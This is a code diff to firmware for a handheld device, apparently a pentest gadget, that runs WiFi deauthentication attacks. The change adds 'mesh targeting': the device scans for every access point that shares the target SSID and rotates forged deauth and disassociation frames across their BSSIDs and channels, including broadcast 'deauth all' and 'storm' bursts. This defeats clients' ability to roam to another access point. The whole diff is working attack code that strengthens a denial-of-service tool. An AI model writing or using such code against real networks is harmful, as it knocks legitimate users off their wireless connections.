@@ -53,6 +53,13 @@ static struct {
     uint8_t consecutive_failures = 0;  // Track failures for adaptive delay
 } deauth_state;
 
+// Store all APs with same SSID for mesh network targeting
+struct APInfo {
+    uint8_t bssid[6];
+    int channel;
+};
+static std::vector<APInfo> sameSSID_APs;
+
 // Função para obter o MAC do gateway (ORIGINAL - DON'T CHANGE)
 void getGatewayMAC(uint8_t gatewayMAC[6]) {
     wifi_ap_record_t ap_info;
@@ -77,6 +84,24 @@ bool macCompare(const uint8_t* mac1, const uint8_t* mac2) {
         if (mac1[i] != mac2[i]) return false;
     }
     return true;
+}
+
+// Cache all APs with same SSID for mesh network targeting
+void cacheSameSSIDAPs() {
+    sameSSID_APs.clear();
+    String currentSSID = WiFi.SSID();
+    if (currentSSID.length() == 0) return;
+    
+    int n = WiFi.scanNetworks(false, false);
+    for (int i = 0; i < n; i++) {
+        if (WiFi.SSID(i) == currentSSID) {
+            APInfo info;
+            memcpy(info.bssid, WiFi.BSSID(i), 6);
+            info.channel = WiFi.channel(i);
+            sameSSID_APs.push_back(info);
+        }
+    }
+    WiFi.scanDelete();
 }
 
 // Ensure WiFi is connected before proceeding
@@ -251,15 +276,16 @@ void sendDeauthFrame(const uint8_t* frame, bool enhanced_mode) {
 }
 
 // Send burst of deauth frames
-void sendDeauthBurst(uint8_t frames[4][26], bool enhanced_mode, uint8_t reason) {
-    // Update all frames with current reason
-    for (int i = 0; i < 4; i++) {
-        frames[i][24] = reason;
-    }
+void sendDeauthBurst(uint8_t* frame1, uint8_t* frame2, uint8_t* frame3, uint8_t* frame4, bool enhanced_mode, uint8_t reason) {
+    frame1[24] = reason;
+    frame2[24] = reason;
+    frame3[24] = reason;
+    frame4[24] = reason;
     
-    for (int i = 0; i < 4; i++) {
-        sendDeauthFrame(frames[i], enhanced_mode);
-    }
+    sendDeauthFrame(frame1, enhanced_mode);
+    sendDeauthFrame(frame2, enhanced_mode);
+    sendDeauthFrame(frame3, enhanced_mode);
+    sendDeauthFrame(frame4, enhanced_mode);
 }
 
 void stationDeauth(Host host) {
@@ -294,6 +320,13 @@ void stationDeauth(Host host) {
     }
 
     int channel = getAPChannel(gatewayMAC);
+
+    // Cache all APs with same SSID for mesh network targeting
+    cacheSameSSIDAPs();
+    bool useMultipleAPs = sameSSID_APs.size() > 1;
+    if (useMultipleAPs) {
+        Serial.printf("[DEAUTH] Found %d APs with same SSID for mesh targeting\n", sameSSID_APs.size());
+    }
 
     bool enhanced_mode = tryMonitorMode(channel);
 
@@ -333,6 +366,9 @@ void stationDeauth(Host host) {
     padprintln("GTW:" + macToString(gatewayMAC));
     padprintln("CH:" + String(channel));
     padprintln("Mode:" + String(enhanced_mode ? "Enhanced" : "AP"));
+    if (useMultipleAPs) {
+        padprintln("Mesh: " + String(sameSSID_APs.size()) + " APs");
+    }
     padprintln("");
     padprintln("Press Any key to STOP.");
 
@@ -340,6 +376,7 @@ void stationDeauth(Host host) {
     int cont = 0;
     int total_frames = 0;
     uint8_t current_reason = 0;
+    int ap_index = 0;
     
     // Reset deauth state for this attack
     deauth_state.reason_index = 0;
@@ -355,9 +392,25 @@ void stationDeauth(Host host) {
             current_reason = DEAUTH_REASONS[deauth_state.reason_index];
         }
 
+        // If multiple APs in mesh, cycle through them
+        if (useMultipleAPs) {
+            ap_index = (ap_index + 1) % sameSSID_APs.size();
+            APInfo& current_ap = sameSSID_APs[ap_index];
+            
+            // Switch channel if needed
+            if (enhanced_mode && current_ap.channel != channel) {
+                esp_wifi_set_channel(current_ap.channel, WIFI_SECOND_CHAN_NONE);
+            }
+            
+            // Build frames with this AP's BSSID
+            buildOptimizedDeauthFrame(deauth_ap_to_sta, targetMAC, current_ap.bssid, current_ap.bssid, current_reason, false);
+            buildOptimizedDeauthFrame(disassoc_ap_to_sta, targetMAC, current_ap.bssid, current_ap.bssid, current_reason, true);
+            buildOptimizedDeauthFrame(deauth_sta_to_ap, current_ap.bssid, targetMAC, current_ap.bssid, current_reason, false);
+            buildOptimizedDeauthFrame(disassoc_sta_to_ap, current_ap.bssid, targetMAC, current_ap.bssid, current_reason, true);
+        }
+
         // Send standard 4-frame deauth
-        sendDeauthBurst({deauth_ap_to_sta, disassoc_ap_to_sta, deauth_sta_to_ap, disassoc_sta_to_ap}, 
-                       enhanced_mode, current_reason);
+        sendDeauthBurst(deauth_ap_to_sta, disassoc_ap_to_sta, deauth_sta_to_ap, disassoc_sta_to_ap, enhanced_mode, current_reason);
         cont += 4;
         total_frames += 4;
         deauth_state.burst_counter++;
@@ -366,7 +419,12 @@ void stationDeauth(Host host) {
         if (cont % 5 == 0) {
             uint8_t broadcast_frame[26];
             uint8_t broadcast_reason = DEAUTH_REASONS[random(DEAUTH_REASON_COUNT)];
-            buildOptimizedDeauthFrame(broadcast_frame, broadcast_mac, gatewayMAC, gatewayMAC, broadcast_reason, false);
+            if (useMultipleAPs) {
+                APInfo& current_ap = sameSSID_APs[ap_index];
+                buildOptimizedDeauthFrame(broadcast_frame, broadcast_mac, current_ap.bssid, current_ap.bssid, broadcast_reason, false);
+            } else {
+                buildOptimizedDeauthFrame(broadcast_frame, broadcast_mac, gatewayMAC, gatewayMAC, broadcast_reason, false);
+            }
             sendDeauthFrame(broadcast_frame, enhanced_mode);
             total_frames++;
         }
@@ -382,8 +440,15 @@ void stationDeauth(Host host) {
                 // Storm mode: send extra frames with minimal delay
                 for (int burst = 0; burst < 10; burst++) {
                     uint8_t burst_reason = DEAUTH_REASONS[random(DEAUTH_REASON_COUNT)];
-                    sendDeauthBurst({deauth_ap_to_sta, disassoc_ap_to_sta, deauth_sta_to_ap, disassoc_sta_to_ap},
-                                   enhanced_mode, burst_reason);
+                    if (useMultipleAPs) {
+                        // Use current AP for storm frames
+                        APInfo& current_ap = sameSSID_APs[ap_index];
+                        buildOptimizedDeauthFrame(deauth_ap_to_sta, targetMAC, current_ap.bssid, current_ap.bssid, burst_reason, false);
+                        buildOptimizedDeauthFrame(disassoc_ap_to_sta, targetMAC, current_ap.bssid, current_ap.bssid, burst_reason, true);
+                        buildOptimizedDeauthFrame(deauth_sta_to_ap, current_ap.bssid, targetMAC, current_ap.bssid, burst_reason, false);
+                        buildOptimizedDeauthFrame(disassoc_sta_to_ap, current_ap.bssid, targetMAC, current_ap.bssid, burst_reason, true);
+                    }
+                    sendDeauthBurst(deauth_ap_to_sta, disassoc_ap_to_sta, deauth_sta_to_ap, disassoc_sta_to_ap, enhanced_mode, burst_reason);
                     total_frames += 4;
                     deauth_state.burst_counter++;
                     delay(1);
@@ -398,8 +463,14 @@ void stationDeauth(Host host) {
                 // Normal burst
                 for (int burst = 0; burst < 5; burst++) {
                     uint8_t burst_reason = DEAUTH_REASONS[random(DEAUTH_REASON_COUNT)];
-                    sendDeauthBurst({deauth_ap_to_sta, disassoc_ap_to_sta, deauth_sta_to_ap, disassoc_sta_to_ap},
-                                   enhanced_mode, burst_reason);
+                    if (useMultipleAPs) {
+                        APInfo& current_ap = sameSSID_APs[ap_index];
+                        buildOptimizedDeauthFrame(deauth_ap_to_sta, targetMAC, current_ap.bssid, current_ap.bssid, burst_reason, false);
+                        buildOptimizedDeauthFrame(disassoc_ap_to_sta, targetMAC, current_ap.bssid, current_ap.bssid, burst_reason, true);
+                        buildOptimizedDeauthFrame(deauth_sta_to_ap, current_ap.bssid, targetMAC, current_ap.bssid, burst_reason, false);
+                        buildOptimizedDeauthFrame(disassoc_sta_to_ap, current_ap.bssid, targetMAC, current_ap.bssid, burst_reason, true);
+                    }
+                    sendDeauthBurst(deauth_ap_to_sta, disassoc_ap_to_sta, deauth_sta_to_ap, disassoc_sta_to_ap, enhanced_mode, burst_reason);
                     total_frames += 4;
                     deauth_state.burst_counter++;
                     delay(1);
@@ -430,7 +501,7 @@ void stationDeauth(Host host) {
             
             // Show storm status if active
             if (deauth_state.storm_active) {
-                tft.drawRightString("⚡STORM", tftWidth - 12, tftHeight - 56, 1);
+                tft.drawRightString("STORM", tftWidth - 12, tftHeight - 56, 1);
             }
         }
     }
@@ -469,6 +540,14 @@ void deauthAll() {
     }
     
     int channel = getAPChannel(gatewayMAC);
+    
+    // Cache all APs with same SSID for mesh network targeting
+    cacheSameSSIDAPs();
+    bool useMultipleAPs = sameSSID_APs.size() > 1;
+    if (useMultipleAPs) {
+        Serial.printf("[DEAUTH] Found %d APs with same SSID for mesh targeting\n", sameSSID_APs.size());
+    }
+    
     bool enhanced_mode = tryMonitorMode(channel);
     
     if (!enhanced_mode) {
@@ -486,6 +565,9 @@ void deauthAll() {
     padprintln("Deauthing all clients...");
     padprintln("Channel: " + String(channel));
     padprintln("Mode: " + String(enhanced_mode ? "Enhanced" : "AP"));
+    if (useMultipleAPs) {
+        padprintln("Mesh: " + String(sameSSID_APs.size()) + " APs");
+    }
     padprintln("");
     padprintln("Press ANY key to STOP.");
     
@@ -493,6 +575,7 @@ void deauthAll() {
     uint8_t frame[26];
     uint32_t start_time = millis();
     int total_frames = 0;
+    int ap_index = 0;
     
     // Reset deauth state for this attack
     deauth_state.reason_index = 0;
@@ -508,7 +591,20 @@ void deauthAll() {
         }
         
         uint8_t reason = DEAUTH_REASONS[deauth_state.reason_index];
-        buildOptimizedDeauthFrame(frame, broadcast_mac, gatewayMAC, gatewayMAC, reason, false);
+        
+        // If multiple APs in mesh, cycle through them
+        if (useMultipleAPs) {
+            ap_index = (ap_index + 1) % sameSSID_APs.size();
+            APInfo& current_ap = sameSSID_APs[ap_index];
+            
+            if (enhanced_mode && current_ap.channel != channel) {
+                esp_wifi_set_channel(current_ap.channel, WIFI_SECOND_CHAN_NONE);
+            }
+            
+            buildOptimizedDeauthFrame(frame, broadcast_mac, current_ap.bssid, current_ap.bssid, reason, false);
+        } else {
+            buildOptimizedDeauthFrame(frame, broadcast_mac, gatewayMAC, gatewayMAC, reason, false);
+        }
         
         sendDeauthFrame(frame, enhanced_mode);
         total_frames++;
@@ -525,7 +621,12 @@ void deauthAll() {
             // Send extra frames in storm mode
             if (random(100) < 30) {
                 uint8_t extra_reason = DEAUTH_REASONS[random(DEAUTH_REASON_COUNT)];
-                buildOptimizedDeauthFrame(frame, broadcast_mac, gatewayMAC, gatewayMAC, extra_reason, false);
+                if (useMultipleAPs) {
+                    APInfo& current_ap = sameSSID_APs[ap_index];
+                    buildOptimizedDeauthFrame(frame, broadcast_mac, current_ap.bssid, current_ap.bssid, extra_reason, false);
+                } else {
+                    buildOptimizedDeauthFrame(frame, broadcast_mac, gatewayMAC, gatewayMAC, extra_reason, false);
+                }
                 sendDeauthFrame(frame, enhanced_mode);
                 total_frames++;
                 deauth_state.burst_counter++;
@@ -548,7 +649,7 @@ void deauthAll() {
             tft.drawRightString("Total: " + String(total_frames), tftWidth - 12, tftHeight - 20, 1);
             
             if (deauth_state.storm_active) {
-                tft.drawRightString("⚡STORM", tftWidth - 12, tftHeight - 56, 1);
+                tft.drawRightString("STORM", tftWidth - 12, tftHeight - 56, 1);
             }
         }
     }
@@ -593,6 +694,14 @@ void deauthTargetList(const std::vector<Host>& targets) {
     }
     
     int channel = getAPChannel(gatewayMAC);
+    
+    // Cache all APs with same SSID for mesh network targeting
+    cacheSameSSIDAPs();
+    bool useMultipleAPs = sameSSID_APs.size() > 1;
+    if (useMultipleAPs) {
+        Serial.printf("[DEAUTH] Found %d APs with same SSID for mesh targeting\n", sameSSID_APs.size());
+    }
+    
     bool enhanced_mode = tryMonitorMode(channel);
     
     if (!enhanced_mode) {
@@ -610,6 +719,9 @@ void deauthTargetList(const std::vector<Host>& targets) {
     padprintln("Deauthing " + String(targets.size()) + " targets...");
     padprintln("Channel: " + String(channel));
     padprintln("Mode: " + String(enhanced_mode ? "Enhanced" : "AP"));
+    if (useMultipleAPs) {
+        padprintln("Mesh: " + String(sameSSID_APs.size()) + " APs");
+    }
     padprintln("");
     padprintln("Press ANY key to STOP.");
     
@@ -617,6 +729,7 @@ void deauthTargetList(const std::vector<Host>& targets) {
     uint32_t start_time = millis();
     int total_frames = 0;
     size_t target_index = 0;
+    int ap_index = 0;
     
     // Reset deauth state
     deauth_state.reason_index = 0;
@@ -639,10 +752,25 @@ void deauthTargetList(const std::vector<Host>& targets) {
             uint8_t frames[4][26];
             uint8_t reason = DEAUTH_REASONS[random(DEAUTH_REASON_COUNT)];
             
-            buildOptimizedDeauthFrame(frames[0], targetMAC, gatewayMAC, gatewayMAC, reason, false);
-            buildOptimizedDeauthFrame(frames[1], targetMAC, gatewayMAC, gatewayMAC, reason, true);
-            buildOptimizedDeauthFrame(frames[2], gatewayMAC, targetMAC, gatewayMAC, reason, false);
-            buildOptimizedDeauthFrame(frames[3], gatewayMAC, targetMAC, gatewayMAC, reason, true);
+            // If multiple APs in mesh, cycle through them
+            if (useMultipleAPs) {
+                ap_index = (ap_index + 1) % sameSSID_APs.size();
+                APInfo& current_ap = sameSSID_APs[ap_index];
+                
+                if (enhanced_mode && current_ap.channel != channel) {
+                    esp_wifi_set_channel(current_ap.channel, WIFI_SECOND_CHAN_NONE);
+                }
+                
+                buildOptimizedDeauthFrame(frames[0], targetMAC, current_ap.bssid, current_ap.bssid, reason, false);
+                buildOptimizedDeauthFrame(frames[1], targetMAC, current_ap.bssid, current_ap.bssid, reason, true);
+                buildOptimizedDeauthFrame(frames[2], current_ap.bssid, targetMAC, current_ap.bssid, reason, false);
+                buildOptimizedDeauthFrame(frames[3], current_ap.bssid, targetMAC, current_ap.bssid, reason, true);
+            } else {
+                buildOptimizedDeauthFrame(frames[0], targetMAC, gatewayMAC, gatewayMAC, reason, false);
+                buildOptimizedDeauthFrame(frames[1], targetMAC, gatewayMAC, gatewayMAC, reason, true);
+                buildOptimizedDeauthFrame(frames[2], gatewayMAC, targetMAC, gatewayMAC, reason, false);
+                buildOptimizedDeauthFrame(frames[3], gatewayMAC, targetMAC, gatewayMAC, reason, true);
+            }
             
             for (int i = 0; i < 4; i++) {
                 sendDeauthFrame(frames[i], enhanced_mode);
